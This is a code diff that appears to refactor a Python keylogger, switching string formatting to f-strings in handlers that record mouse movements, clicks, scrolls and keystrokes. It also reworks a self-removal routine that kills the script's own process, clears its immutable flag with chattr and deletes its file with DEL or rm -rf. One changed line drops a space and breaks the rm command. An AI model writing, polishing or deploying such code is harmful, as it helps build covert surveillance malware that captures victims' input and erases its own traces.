@@ -36,15 +36,15 @@ finally:
             self.log = self.log + string
 
         def on_move(self, x, y):
-            current_move = logging.info("Mouse moved to {} {}".format(x, y))
+            current_move = logging.info(f"Mouse moved to {x} {y}")
             self.appendlog(current_move)
 
         def on_click(self, x, y):
-            current_click = logging.info("Mouse moved to {} {}".format(x, y))
+            current_click = logging.info(f"Mouse moved to {x} {y}")
             self.appendlog(current_click)
 
         def on_scroll(self, x, y):
-            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
+            current_scroll = logging.info(f"Mouse moved to {x} {y}")
             self.appendlog(current_scroll)
 
         def save_data(self, key):
@@ -56,7 +56,7 @@ finally:
                 elif key == key.esc:
                     current_key = "ESC"
                 else:
-                    current_key = " " + str(key) + " "
+                    current_key = f" {str(key)} "
 
             self.appendlog(current_key)
 
@@ -121,21 +121,21 @@ finally:
             if os.name == "nt":
                 try:
                     pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
-                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
+                    os.system(f"cd {pwd}")
+                    os.system(f"TASKKILL /F /IM {os.path.basename(__file__)}")
                     print('File was closed.')
-                    os.system("DEL " + os.path.basename(__file__))
+                    os.system(f"DEL {os.path.basename(__file__)}")
                 except OSError:
                     print('File is close.')
 
             else:
                 try:
                     pwd = os.path.abspath(os.getcwd())
-                    os.system("cd " + pwd)
+                    os.system(f"cd {pwd}")
                     os.system('pkill leafpad')
-                    os.system("chattr -i " +  os.path.basename(__file__))
+                    os.system(f"chattr -i {os.path.basename(__file__)}")
                     print('File was closed.')
-                    os.system("rm -rf" + os.path.basename(__file__))
+                    os.system(f"rm -rf{os.path.basename(__file__)}")
                 except OSError:
                     print('File is close.')
 
